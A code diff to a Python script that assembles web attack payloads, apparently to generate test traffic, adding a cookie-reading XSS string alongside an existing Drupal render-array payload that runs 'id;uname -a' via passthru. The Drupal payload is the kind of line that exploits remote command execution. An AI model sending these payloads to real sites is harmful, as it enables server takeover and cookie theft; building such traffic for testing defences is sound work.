@@ -34,10 +34,17 @@ def main():
 	drupal['payload'] = '/page.node?q=node/99/delete&destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id;uname+-a'
 	drupal['location'] = 'query_string'
 
+	# triggers something
+	XSS = {}
+	XSS['name'] = 'XSS'
+	XSS['payload'] = '/page.aspx?<script>document.cookie()'
+	XSS['location'] = 'query_string'
+
 	# we want drupal to show up 4x as often as the other attacks
 	payloads = []
 	payloads.append(path_traversal)
 	payloads.append(SQLi)
+	payloads.append(XSS)
 	payloads.append(drupal)
 	payloads.append(drupal)
 	payloads.append(drupal)
